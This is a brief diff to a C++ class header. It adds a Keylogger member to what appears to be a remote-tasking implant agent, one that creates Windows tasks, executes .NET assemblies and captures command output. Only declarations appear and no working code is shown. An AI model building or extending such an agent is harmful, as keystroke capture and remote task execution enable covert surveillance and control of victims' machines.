@@ -31,6 +31,7 @@ public:
 	Response CreateWindowsTaskW(const int& taskID, const CommandWinTask& request);
 	Response ExecuteNetAsm(const int& taskID, const CommandNetAsm& request);
 private:
+	Keylogger keylogger;
 	CommManager commManager;
 	TaskQueueManager taskManager;
 	std::string CaptureCommandOutput(const std::string& cmd);
